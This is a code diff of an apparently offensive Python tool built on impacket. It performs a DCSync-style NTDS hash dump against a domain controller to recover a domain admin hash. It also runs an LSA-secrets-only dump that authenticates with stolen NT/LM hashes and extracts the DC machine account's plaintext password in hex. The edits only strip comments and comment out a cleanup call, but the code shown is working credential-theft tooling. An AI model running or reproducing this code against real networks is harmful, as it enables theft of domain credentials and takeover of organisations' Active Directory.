@@ -1,6 +1,8 @@
 from impacket.examples.secretsdump import NTDSHashes, RemoteOperations, LSASecrets
 from impacket.smbconnection import SMBConnection
 
+
+
 class TargetDCSync:
     def __init__(self, username, domain, dc_ip, target_user):
         self.username = username
@@ -39,7 +41,7 @@ class TargetDCSync:
         
         ntds.dump()
 
-        remoteOps.finish()
+        # remoteOps.finish()
         smbConnection.close()
         
         if self.recovered_da_hash:
@@ -58,31 +60,28 @@ class LSAOnlyDump:
         
 
     def _lsa_callback(self, secret_type, secret):
-        """Callback to capture the plain_password_hex"""
         if "plain_password_hex:" in str(secret):
             self.hex_password = secret.split("plain_password_hex:")[1].strip()
             print("[+] Got target DC hex pass!")
-
-
-
-        
+            
+            
     def dump_lsa_only(self):
 
         conn = SMBConnection(self.dc_ip, self.dc_ip)
         conn.login(
             self.username, 
-            None,  # Empty password when using hash
+            None, 
             self.domain, 
             self.lmhash, 
             self.nthash
         )
         
-        # Setup remote ops
+
         remote_ops = RemoteOperations(conn, doKerberos=False)
         remote_ops.enableRegistry()
         bootkey = remote_ops.getBootKey()
         
-        # Dump ONLY LSA secrets (not SAM, not NTDS)
+
         SECURITYFileName = remote_ops.saveSECURITY()
         
         lsa = LSASecrets(
@@ -90,7 +89,7 @@ class LSAOnlyDump:
             bootkey,
             remote_ops,
             isRemote=True,
-            perSecretCallback=self._lsa_callback  # Use callback to capture
+            perSecretCallback=self._lsa_callback 
         )
         
         print("[*] Dumping LSA secrets only")
